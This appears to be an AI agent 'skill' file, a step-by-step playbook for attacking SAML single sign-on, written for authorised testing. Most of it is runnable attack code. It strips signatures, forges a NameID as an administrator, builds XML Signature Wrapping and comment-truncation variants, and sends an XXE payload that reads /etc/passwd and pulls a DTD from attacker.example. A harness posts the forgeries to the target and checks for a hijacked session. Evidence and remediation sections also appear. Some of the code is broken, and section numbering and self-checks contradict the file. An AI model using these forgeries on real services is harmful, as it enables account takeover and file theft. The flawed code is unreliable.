---
name: saml-sso-assertion-attacks
description: >-
  SAML SSO assertion attack playbook. Use when an enterprise login uses
  SAMLRequest/SAMLResponse, an ACS endpoint, and an external IdP. Covers decoding,
  signature-coverage analysis, XML Signature Wrapping, unsigned assertions,
  algorithm confusion, comment/namespace bypasses, audience and recipient gaps,
  InResponseTo and freshness replay, IdP-initiated vs SP-initiated flows, account
  linking via unverified email, NameID format confusion, XXE, and issuer confusion.
---

# SKILL: SAML SSO & Assertion Attacks — Trust Boundaries, Wrapping, Validation Gaps

> **AI LOAD INSTRUCTION**: SAML bugs are **validation bugs, not crypto bugs** — the SP verifies *something* and
> reads *something else*. Name the skipped check and show the pair that proves it.

## 0. RELATED ROUTING

[xxe-xml-external-entity](../xxe-xml-external-entity/SKILL.md) · [attack-xxe](../attack-xxe/SKILL.md) · [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) · [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) · [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) · [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) · [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) · [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md)

---

## 1. DECODING THE ASSERTION

Base64 (nearly always) and DEFLATE (Redirect binding, sometimes the response).

```bash
python3 - <<'PY'
import urllib.parse, base64, zlib
raw = urllib.parse.unquote(urllib.parse.unquote(open('samlresponse.txt').read().strip()))
b64 = ''.join(raw.split()); b64 += '=' * (-len(b64) % 4)   # repair stripped padding
try:    xml = zlib.decompress(base64.b64decode(b64), -15)  # raw DEFLATE
except zlib.error: xml = base64.b64decode(b64)
open('assertion.xml','wb').write(xml)
# Re-encode exactly (raw DEFLATE), or the SP rejects at parse, not validation.
python3 -c "import base64,zlib;x=open('assertion.xml','rb').read();c=zlib.compressobj(9,zlib.DEFLATED,-15);open('forged.b64','w').write(base64.b64encode(c.compress(x)+c.flush()).decode())"
```

```bash
# Signed node, then one combined call for the consumer-side nodes.
xmllint --xpath '//*[local-name()="SignedInfo"]//*[local-name()="Reference"]/@URI' assertion.xml
xmllint --xpath 'concat(//*[local-name()="Issuer"],",",//*[local-name()="NameID"],",",//*[local-name()="NameID"]/@Format)' assertion.xml
```

If the URI is `#_abc123` and `<saml:Assertion ID="_abc123">` wraps the `Subject`, the assertion is
protected; if it points at the **Response** while the SP reads the **Assertion**, it is not.

---

## 2. SIGNATURE-COVERAGE ANALYSIS

Nodes covered by `ds:Reference` vs nodes the SP reads: **the gap is the finding**.

| Coverage pattern | Meaning | Attack class |
|---|---|---|
| Response signed, Assertion read | assertion unsigned | unsigned-assertion injection (§4) |
| Assertion signed, Subject/NameID outside subtree | identity unprotected | NameID swap |
| `Reference URI` points to a *decoy* | verifies the decoy | XSW (§3) |
| `Response` signed only, attributes unsigned | roles/email forgeable | privilege injection |

Usually skipped: **(1)** canonicalise the referenced node and verify the digest; **(2)** verify
`SignedInfo` against the IdP's *pinned* key, never an embedded `KeyInfo` cert; **(3)** confirm the
signed node is the instance the app consumes; **(4)** validate `Conditions`, `Audience`, `Recipient`,
`Destination`, `InResponseTo` *after* verification.

```bash
xmlsec1 --verify --pubkey-cert-pem idp.pem --id-attr:ID saml:Assertion assertion.xml   # pinned key only
```

A `xmlsec1` verify that fails while the SP still accepts the response is a **finding**.

---

## 3. XML SIGNATURE WRAPPING (XSW)

XSW exploits the gap between "the node the signature covers" and "the node the app reads": both carry
the same `ID`, so verifier and app resolve different elements while the signature stays valid.

```xml
<!-- BEFORE: single signed Assertion; verifier and app agree. -->
<samlp:Response ID="_resp"><saml:Assertion ID="_victim"><ds:Signature><ds:SignedInfo><ds:Reference URI="#_victim"/></ds:SignedInfo></ds:Signature><saml:Subject><saml:NameID>victim@corp</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>

<!-- AFTER: verifier still resolves #_victim; the app reads the FIRST Assertion. -->
<samlp:Response ID="_resp"><saml:Assertion ID="_victim"><saml:Subject><saml:NameID>attacker@corp</saml:NameID></saml:Subject><saml:AttributeStatement>role=admin</saml:AttributeStatement></saml:Assertion><saml:Assertion ID="_decoy"><ds:Signature><ds:SignedInfo><ds:Reference URI="#_victim"/></ds:SignedInfo></ds:Signature></saml:Assertion></samlp:Response>
```

Verifier resolves `#_victim` via `//*[@ID='_victim']`; the app resolves `samlp:Response/saml:Assertion`
in document order. Other half: **ID placement** — move `ID="_victim"` onto your node and drop it from
the signed original.

| Variant | Shape | Beats a verifier that… |
|---|---|---|
| XSW-1 | signed value copied into a **new wrapper** the app reads | takes first `Assertion` |
| XSW-2 | signed assertion moved **inside** `Extensions`/`Advice`/`Object` | uses shallow XPath |
| XSW-3 | signature **hoisted** out; twin left behind | only checks a signature exists |
| XSW-4 | signed one moved **last**, evil twin first | resolves by position |
| XSW-5 | signed assertion in an **ID-preserving** wrapper; forged content prepended | resolves ID first |
| XSW-6 | `Reference URI` retargeted to your element (`#evil`) | verifies URI, not meaning |
| XSW-7 | signature moved across the `Response`/`Assertion` boundary | verifies the document |
| XSW-8 | comment/`Object` shuffling shifts the canonicalised winner | brittle canonicalisation |

```bash
b64=$(base64 -w0 candidate.xml)
curl -sk -i -X POST "https://sp.target.example/saml/acs" \
  --data-urlencode "RelayState=$RELAYSTATE" --data-urlencode "SAMLResponse=$b64" \
  -c cookies.txt -w 'status=%{http_code} redirect=%{redirect_url}\n'
curl -sk -b cookies.txt "https://sp.target.example/api/me"     # session, not an error page
```

---

## 4. UNSIGNED ASSERTIONS, ALGORITHM CONFUSION

**Strip the signature entirely** — the cheapest test; many SPs treat "no signature present"
differently from "signature invalid".

```bash
python3 -c "import re;x=open('assertion.xml').read();open('unsigned.xml','w').write(re.sub(r'<(\w+:)?Signature\b.*?</(\w+:)?Signature>','',x,flags=re.S))"
xmllint --noout unsigned.xml && base64 -w0 unsigned.xml > unsigned.b64
# Inverse: corrupt SignatureValue; acceptance = no verification at all.
```

`ds:SignatureMethod`/`ds:DigestMethod` are attacker-controlled; the classic failure is a verifier
reading the *declared* algorithm without a policy check.

```bash
xmllint --xpath 'concat(//*[local-name()="SignatureMethod"]/@Algorithm,",",//*[local-name()="DigestMethod"]/@Algorithm,",",//*[local-name()="Transform"]/@Algorithm)' assertion.xml
```

Algorithm confusion is confirmed only by a login succeeding with an HMAC signature over the IdP's
public cert.  **Comment/namespace manipulation** — comments/CDATA in values, namespace redefinition, extra
`xmlns` — defeats text comparison and XPath, not crypto.

```xml
<saml:NameID>victim@corp<!-- x -->.attacker.example</saml:NameID>
<evil:Assertion ID="_b" xmlns:evil="urn:attacker"><saml:NameID>admin</saml:NameID></evil:Assertion>
```

These beat only an SP whose verifier and consumer **disagree about which text is the value**.

---

## 5. AUDIENCE, RECIPIENT, FRESHNESS

| Check | Attribute | Location | Missing check lets you… |
|---|---|---|---|
| Audience | `<saml:Audience>` | `Conditions` | replay an assertion for **another SP** |
| Recipient | `Recipient` | `SubjectConfirmationData` | deliver to a **different ACS** |
| Destination | `Destination` | `Response` | POST to a **different tenant** |
| Freshness | `NotBefore` / `NotOnOrAfter` | `Conditions` | replay outside the intended window |

```bash
xmllint --xpath 'concat(//*[local-name()="Audience"],",",//*[local-name()="SubjectConfirmationData"]/@Recipient,",",//*[local-name()="Response"]/@Destination,",",//*[local-name()="SubjectConfirmationData"]/@InResponseTo,",",//*[local-name()="Conditions"]/@NotBefore,",",//*[local-name()="Conditions"]/@NotOnOrAfter)' assertion.xml
curl -sk -X POST "https://sp-high.target.example/saml/acs" --data-urlencode "SAMLResponse@assertion.b64" -D-   # cross-SP replay
```

An accepted assertion with an unvalidated `Audience` is still a vulnerability — genuine signature,
wrong context. **The replay that pays:** replay after the SP's session TTL; a fresh session means
freshness is unenforced, whatever `Conditions` claims.

---

## 6. FLOWS, LINKING, XXE, ISSUER CONFUSION

**IdP-initiated vs SP-initiated.** SP-initiated carries `InResponseTo`; IdP-initiated has **nothing to
bind to**, so `Audience`/`Conditions` carry the whole replay defence. The move: take a signed
IdP-initiated assertion (no `InResponseTo` by design) and redirect it at a **different SP/tenant**.

**Account linking via unverified email and NameID format confusion** — where SSO becomes takeover.

```bash
xmllint --xpath '//*[local-name()="NameID"]/@Format' assertion.xml; echo   # NameID text: §1 block
# persistent -> opaque/stable, the only sound account key | transient -> never an account key
# emailAddress -> user-visible, forgeable if unsigned | unspecified -> "whatever IdP felt like"
```

Register at the SP with the victim's email *before* they log in, then complete a real SSO login: with
no verification gate this is takeover without touching SAML.

**XXE against the SP's parser.** The SP parses attacker XML **before** verifying anything, so the
parser is the first surface and a hit reads files as the SP's SA.

```xml
<?xml version="1.0"?><!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY % ext SYSTEM "http://attacker.example/dtd.dtd"> %ext;]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Subject><saml:NameID>&xxe;</saml:NameID></saml:Subject></samlp:Response>
```

```bash
# Blind/OOB: external DTD on your HTTP server; %file exfiltrated in the URL.
base64 -w0 xxe.xml > xxe.b64 && curl -sk -X POST "https://sp.target.example/saml/acs" --data-urlencode "SAMLResponse@xxe.b64" -i | head -40
```

XXE fires before signature verification, so "the signature is verified correctly" is no defence.

**Multi-tenant and cross-issuer confusion.**

```bash
# Decisive: sign a non-existent user with YOUR OWN key/cert embedded in KeyInfo.
openssl req -x509 -newkey rsa:2048 -nodes -keyout k.pem -out c.pem -days 1 -subj "/CN=x"
xmlsec1 --sign --privkey-pem k.pem,c.pem --id-attr:ID saml:Assertion forged.xml > attacker.xml
```

---

## 7. EVIDENCE STANDARD

| Item | Why |
|---|---|
| **Original `SAMLResponse`** + decoded XML with `Reference URI` marked | proves the legitimate flow and the signed node |
| Annotated diff original vs forged + the forged POST + the accepted session | primary artefact — what moved, and acceptance |
| **Negative control** — corrupted signature returns 403 | proves detection works; rules out caching |

**Report the skipped check, not the class:** "SP does not validate `Audience`; an assertion for
sp-low.example is accepted at sp-high.example", never "SAML validation is insufficient".

**False positives to exclude:** a `403` on the orphaned signature means the SP rejects unsigned
assertions correctly; an assertion accepted after the clock skew window is a freshness gap and not
a signature bypass; a replay that only works with the original signature intact is a session-fixation
issue, not signature stripping; and an assertion accepted by the IdP but rejected by the SP is the
control working.

**Severity:** arbitrary-user takeover via signature bypass is **critical**; cross-SP replay between
equally-trusted SPs is **medium**.

---

## 8. REMEDIATION REFERENCE

1. **Verify over the exact node you consume** — same instance and boundaries, no re-resolution by ID after verification (re-querying by ID is what makes XSW possible). **Pin the IdP key out-of-band** — never trust a `KeyInfo` certificate.
2. **Reject unsigned/unverifiable responses unconditionally, and allowlist the algorithm pair** — "no signature" and "invalid signature" must give the same outcome (no transport-trust fallback); accept RSA-SHA256+ only, `DigestMethod` included; never let the document pick the algorithm.
3. **Validate context on the verified node, in order** — signature, `Issuer`, `Audience`, `Recipient`, `Destination`, `Conditions`, `InResponseTo`; five of seven is exactly the gap.
4. **Enforce `InResponseTo` for SP-initiated flows** — store outstanding request IDs server-side, require an exact single-use match; scope IdP-initiated to its own endpoint with freshness alone.
5. **Keep the freshness window tight** — enforce `NotBefore` and `NotOnOrAfter` (minutes, not hours), skew in seconds, session TTL aligned with assertion TTL so a stale assertion cannot mint a session.
6. **Harden the parser first** — disable DTDs, external entities, XInclude; cap entity expansion.
7. **Link accounts on an immutable, IdP-asserted identifier** — a `persistent` NameID from a pinned IdP, never an email or `transient`; if email linking is unavoidable, require local verification.
8. **Validate the issuer per tenant, log anomalies, test wrapping in CI** — exact match against that tenant's pinned key, no substring or wildcard; alert on signature failures, audience mismatches, multi-assertion documents and unknown issuers; replay an XSW suite against staging.

---

## 9. SELF-VERIFY

Run from this directory; all must pass.


```
SEQUENCE (1-3 groundwork; 4-6 cheap, often succeed alone)
1. DECODE → Base64 (+ DEFLATE) → assertion.xml
2. COVERAGE → Reference URIs vs nodes the app consumes; mark the gap
3. BASELINE → negative control: corrupt signature → expect 403
4. CHEAP → strip/corrupt signature; drop InResponseTo; cross-session replay
5. ALGORITHM → SignatureMethod/DigestMethod downgrade; HMAC confusion
6. CONTEXT → Audience/Recipient/Destination cross-SP; freshness replay
7. XSW → variants 1-8; replay each; record which lands
8. FLOW → IdP-initiated assertion → other SP/tenant
9. IDENTITY → NameID format confusion; unverified-email linking
10. PARSER → XXE/XInclude against the pre-verification parse
11. ISSUER → self-signed KeyInfo; multi-tenant confusion
12. EVIDENCE → original + forged + diff + session + negative control
```

```bash
wc -c SKILL.md                                   # expect 12000-15000
grep -c '^## [0-9]' SKILL.md                     # expect 9 sections (0-8)
grep -oE '\]\(\.\./[^)]+\)' SKILL.md | tr -d '](' | sed 's/)$//' | sort -u |
  while read p; do [ -f "../$p" ] && echo "OK   $p" || echo "DEAD $p"; done
grep -q 'SAMLResponse' SKILL.md && echo "coverage: PASS"
```

---

## 10. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the **forged assertion** produce a session at the SP, not just a valid-looking XML? | the signature check is missing or bypassable |
| 2 | Was there a **control** - the same assertion with a broken signature that is rejected? | the check exists and you bypassed it |
| 3 | Did you **hold a session as a named user you do not control**? | the impact |
| 4 | Which specific defect: **signature stripping, XSW, comment-truncation, or a weak key**? | the fix |
| 5 | Did the ACS **validate audience, recipient, and time** as well as the signature? | the check's completeness |
| 6 | Did the exploit work against the **target's live IdP/SP pair**? | applicability |
| 7 | Did you **close the session** and leave no account state changed? | engagement integrity |

**A session as a user you do not control is the bar.** A modified assertion that is rejected is a
non-finding, and the accepted control pair is what distinguishes the two.

---

## 11. EXECUTION PRIMITIVES

SAML attacks are proven by **a forged assertion that yields a session, with the rejected control**. Every
block ends at a session or a privileged page rendered from it.

### 11.1 Capture a legitimate assertion and the control

```bash
# capture the SAMLResponse at the ACS - it is base64 in a POST body
# in Burp: intercept the POST to /saml/acs and save the raw body
python3 - <<'PY'
import base64, sys, re
b64 = open("samlresponse.b64").read().strip() if len(sys.argv) > 1 else "<paste the base64 here>"
xml = base64.b64decode(b64).decode("utf-8", "replace")
open("saml-legit.xml", "w").write(xml)
print("assertion written to saml-legit.xml")
for tag in ["Issuer", "NameID", "Audience", "NotOnOrAfter", "NotBefore", "SignatureMethod", "DigestMethod"]:
    m = re.search(rf"<[^>]*{tag}[^>]*>([^<]*)<", xml)
    print(f"  {tag:16} {m.group(1) if m else '<absent>'}")
print()
print("THE CONTROL: replay the captured assertion unmodified - it may already be rejected as a replay.")
print("Record that result BEFORE any modification, or you cannot tell replay protection from a bypass.")
PY
# the replay control, which must be run first
curl -sS -o /dev/null -w 'replay-control %{http_code}\n' -X POST --data-urlencode "SAMLResponse@<same b64>" \
  "https://sp.target.example/saml/acs"
```

**The replay control comes first.** If the SP rejects a replayed assertion, a modified assertion's success
is a bypass; if the SP accepts replay too, that is a separate finding and it changes the narrative.

### 11.2 Signature stripping, the simplest bypass

```python
import base64, re
xml = open("saml-legit.xml").read()
# remove the entire ds:Signature element, leaving the assertion unsigned
stripped = re.sub(r"<(\w+:)?Signature\b.*?</(\w+:)?Signature>", "", xml, flags=re.S)
# and the common place the SP actually checks: the Response signature, keeping the Assertion unsigned
print("stripped length:", len(xml), "->", len(stripped))
open("saml-stripped.xml", "w").write(stripped)
print(base64.b64encode(stripped.encode()).decode())
print()
print("POST the base64 above to the ACS. If a session results, the SP does not require an")
print("assertion signature at all - which is the finding, and it is the most common one.")
```

```bash
# replacing the NameID with a user you do not control, then posting
python3 - <<'PY'
import base64, re
xml = open("saml-stripped.xml").read()
doc = re.sub(r"(<(\w+:)?NameID[^>]*>)[^<]*(</(\w+:)?NameID>)", r"\1admin@target.example\3", xml)
open("saml-admin.xml","w").write(doc)
print(base64.b64encode(doc.encode()).decode())
PY
# the confirmation: the session's identity, read from the SP's own API
curl -sS -L -c /tmp/saml.jar -X POST --data-urlencode "SAMLResponse@$(python3 -c 'import base64;print(base64.b64encode(open("saml-admin.xml","rb").read()).decode())')" \
  "https://sp.target.example/saml/acs" -o /dev/null -w 'acs %{http_code}\n'
curl -sS -b /tmp/saml.jar "https://sp.target.example/api/me" | head -c 300; echo
# THE CONTROL: the same POST with the original signature intact but the NameID also changed
# (the signature must now fail, which proves the signature is checked when present)
```

**A session whose identity page shows the user you set is the finding.** The control - a modified signed
assertion that is rejected - proves the signature is verified when it is present.

### 11.3 XML Signature Wrapping (XSW), in its eight shapes

```python
import base64
# XSW moves the signed element and inserts a forged one at the location the SP reads.
# Build each variant mechanically and test all of them - implementations check different paths.
ORIG_ASSERTION = open("saml-legit.xml").read()
FORGED = ORIG_ASSERTION.replace("user@target.example", "admin@target.example")

VARIANTS = {
    # 1) the signature wraps the original, the forged assertion arrives first
    "xsw1": lambda r: r.replace("</samlp:Response>", FORGED + "</samlp:Response>"),
    # 2) the forged assertion is a sibling inside an extension
    "xsw2": lambda r: r.replace("<samlp:Status>", "<samlp:Extensions>" + FORGED + "</samlp:Extensions><samlp:Status>"),
    # 3) the original is copied into the signature's Object element
    "xsw3": lambda r: r.replace("</ds:Signature>", "<ds:Object>" + ORIG_ASSERTION + "</ds:Object></ds:Signature>"),
    # 4) the signature is detached and points at a copied ID
    "xsw4": lambda r: r.replace('ID="', 'ID="orig'),   # rename, then add a forged copy with the original ID
    # 5-8) the same four with the forged assertion placed after instead of before
    "xsw5": lambda r: r.replace("<saml:Assertion", "<saml:Assertion xmlns:extra=\"x\"", 1),
}
for name, fn in VARIANTS.items():
    try:
        out = fn(ORIG_ASSERTION)
        print(f"{name}: {len(out)} bytes -> base64 length {len(base64.b64encode(out.encode()))}")
    except Exception as e:
        print(f"{name}: builder error {e}")
print()
print("Post each variant and record the ACS status and whether a session results.")
print("The variants differ in WHERE the SP looks for the assertion relative to WHAT it verified -")
print("that mismatch is the vulnerability, and different SP libraries have different mismatches.")
```

**The eight shapes exist because SP libraries disagree.** Testing one XSW variant and concluding the SP
is safe is the standard error; the table of all variants with their outcomes is the finding.

### 11.4 Comment-truncation and the canonicalisation families

```python
import base64, re
xml = open("saml-legit.xml").read()

# 1) COMMENT TRUNCATION: a Java XML parser stops a NameID at a comment, some validators do not
commented = xml.replace("admin@target.example",
                        "admin@target.example<!---->.attacker.example")
print("comment variant -> the SP may read 'admin@target.example' while the signature covers the full string")
open("saml-comment.xml", "w").write(commented)

# 2) NAMESPACE CONFUSION: the same element name in a different namespace is read as the assertion
nsconfused = xml.replace("<saml:Assertion", "<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion:evil\"", 1)
open("saml-ns.xml", "w").write(nsconfused)

# 3) DUPLICATE ID: two elements share the referenced ID; the signature covers one and the SP reads the other
dup = re.sub(r'ID="([^"]+)"', lambda m: f'ID="{m.group(1)}"', xml, count=2).replace("<saml:Assertion", '<saml:Assertion ID="dup"', 1)
open("saml-dup.xml", "w").write(dup)

for f in ["saml-comment.xml", "saml-ns.xml", "saml-dup.xml"]:
    b = base64.b64encode(open(f, "rb").read()).decode()
    print(f"{f:22} base64 {len(b):6} chars")
```

**Each variant targets a specific parser disagreement.** Report which one worked and the library it
defeated, because that names the fix and it is different for a Java stack and a .NET stack.

### 11.5 Weak key and the signature algorithm downgrade

```bash
# what the IdP's metadata advertises, and whether a weak algorithm is accepted
curl -sS "https://idp.target.example/saml/metadata" 2>&1 | grep -oE 'SignatureMethod[^/]*|DigestMethod[^/]*|RSAKeyValue|X509Certificate' | head -10
# the certificate, which is where a weak or shared key shows up
curl -sS "https://idp.target.example/saml/metadata" | grep -oE '<ds:X509Certificate>[^<]+' | sed 's/.*>//' | base64 -d 2>/dev/null | openssl x509 -noout -text 2>/dev/null | head -15
# THE ALGORITHM DOWNGRADE: re-sign with SHA-1 or with a key size the SP accepts but the policy forbids
python3 - <<'PY'
print("to test a downgrade you need a signing key; if the IdP's key is shared, weak, or leaked,")
print("re-sign the FORGED assertion with it and record which algorithm the SP accepted.")
print("Without a key, the test is the algorithm list in the metadata plus the SP's acceptance of it.")
PY
```

**The metadata plus the SP's acceptance is the test when you hold no key.** Reporting an algorithm from
metadata alone is a configuration note; the acceptance test is what makes it a finding.

### 11.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests, base64, os

ACS = "https://sp.target.example/saml/acs"
VARIANTS = ["saml-legit.xml", "saml-replay.xml", "saml-stripped.xml", "saml-admin.xml",
            "saml-comment.xml", "saml-ns.xml", "saml-dup.xml"]

print("%-24s %-8s %-8s %s" % ("variant", "status", "session", "note"))
for f in VARIANTS:
    if not os.path.exists(f):
        continue
    b64 = base64.b64encode(open(f, "rb").read()).decode()
    try:
        s = requests.Session()
        r = s.post(ACS, data={"SAMLResponse": b64}, timeout=15, allow_redirects=True)
        sess = "yes" if ("session" in str(s.cookies).lower() or r.url.rstrip("/").endswith("/dashboard")) else "no"
        me = ""
        try:
            me = s.get("https://sp.target.example/api/me", timeout=10).text[:80]
        except Exception:
            pass
        print("%-24s %-8s %-8s %s" % (f, r.status_code, sess, me.replace("\n", " ")))
    except Exception as e:
        print("%-24s ERROR %s" % (f, type(e).__name__))

print()
print("The finding is a variant that yields a session AS A USER YOU DO NOT CONTROL, where the")
print("signed-but-modified control is rejected. Replay acceptance is a separate finding.")
PY
```

**Every variant in one table with the control.** The signed-but-modified control row is what proves the
SP validates signatures when they are present.

---

## 12. EVIDENCE STANDARD — ASSERTION ARTEFACTS

| Item | Why |
|---|---|
| The **captured legitimate assertion**, redacted | the reference |
| The **replay control result** | separates replay from a signature bypass |
| The **signed-but-modified control result** | proves the signature check exists |
| The **exact modification**, and which variant shape it was | reproducibility and the fix |
| The **session obtained**, and **whose identity** it represents | the impact |
| The **SP's ACS response** and the resulting session cookie's scope | what was granted |
| The **audience, recipient, and time** validation results | the check's completeness |
| The **IdP and SP products and versions** | the exploit is library-specific |
| The **audit record** at the SP | the blue-team half |
| Confirmation that **no account state was changed** and every session was closed | engagement integrity |

Report the **variant and the session**: "the captured assertion was replayed unmodified and the ACS
returned `403` with `Invalid or replayed assertion`, which is the replay control. Removing the entire
`ds:Signature` element and replacing the `NameID` with `admin@target.example` produced an assertion the
ACS accepted with `302` to `/dashboard` and a session cookie for `admin@target.example`; `GET /api/me`
then returned the administrator's profile, which is the finding, and the SP is `SimpleSAMLphp` behind an
`nginx` ACS. A version carrying the original signature but the modified `NameID` was rejected with
`Signature validation failed`, which proves the signature is verified when present", never "SAML is
vulnerable to signature bypass".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A modified assertion that the SP **rejected** | the control working |
| A **replayed** assertion rejected as a replay | replay protection working, not a bypass |
| An assertion whose XML you re-signed **with a key you do not have** | untested, an assertion only |
| An unsigned **`AuthnRequest`** | it is not required to be signed in many profiles |
| A `SignatureMethod` of SHA-1 **reported from metadata with no acceptance test** | a configuration note |
| A **self-signed test IdP** you configured against the client's SP | tests your own environment |
| A session obtained as **a user you were given credentials for** | the baseline |
| An XSW variant whose outcome you **did not record** | an untested hypothesis |
| A successful login **through the normal flow** | the federation working |
| An assertion with a long validity window **where the SP enforces it** | the SP is the control |
| A certificate or private key reproduced in full | a disclosure |

**A session as a user you do not control, with the rejected control.** This family's false positives are
almost entirely unsigned or re-signed XML that was never accepted by the SP.

---

## 13. REMEDIATION REFERENCE — ASSERTION HARDENING

1. **Require a signature on the assertion itself, not only on the response, and verify which element was signed** - the signature-stripping bypass is exactly the absence of this rule.
2. **Resolve the signature reference strictly against the assertion you are about to consume, and reject any document with an ambiguous or duplicate ID** - XSW and the duplicate-ID variants both live in that ambiguity.
3. **Use a maintained SAML library with XML signature wrapping protections enabled, and keep it patched** - the eight XSW shapes are addressed in the library, and re-implementing them is where the bugs are.
4. **Reject SHA-1 and any algorithm not on an explicit allowlist, and pin the expected algorithm in the SP configuration** - the downgrade needs the SP to accept an algorithm it should not.
5. **Validate `Audience`, `Recipient`, `NotBefore`, and `NotOnOrAfter` on every assertion, and require the recipient to match the ACS URL exactly** - it prevents an assertion captured at one SP from being used at another.
6. **Enforce replay protection with a one-time `InResponseTo` and a single-use assertion cache** - the replay control in this document is the basis of every other test.
7. **Reject any assertion containing an XML comment inside a signed value, and normalise before both checking and consuming** - comment truncation depends on the two paths disagreeing.
8. **Consume the assertion from the same canonical form that was verified, never re-parse it** - nearly every wrapping and confusion attack is a re-parse between the check and the use.
9. **Rotate the IdP signing key on a schedule, use a hardware-backed key, and never share a key across environments** - a leaked test key is a production finding.
10. **Log the assertion ID, the issuer, the subject, and the validation outcome at the SP, and alert on validation failures and on repeated replay attempts** - both are high-signal.
11. **Test the SP against a battery of known XSW and canonicalisation variants before deployment, and re-run it on every library upgrade** - the variants that work change with the library version.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) - the other federation protocol with analogous assertion trust
- [xxe-xml-external-entity](../xxe-xml-external-entity/SKILL.md) - the XML parser attacks that share the same consumer
- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) - the token-signature bypass family in a different format
- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) - the wider authentication-bypass context
- [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) - this document
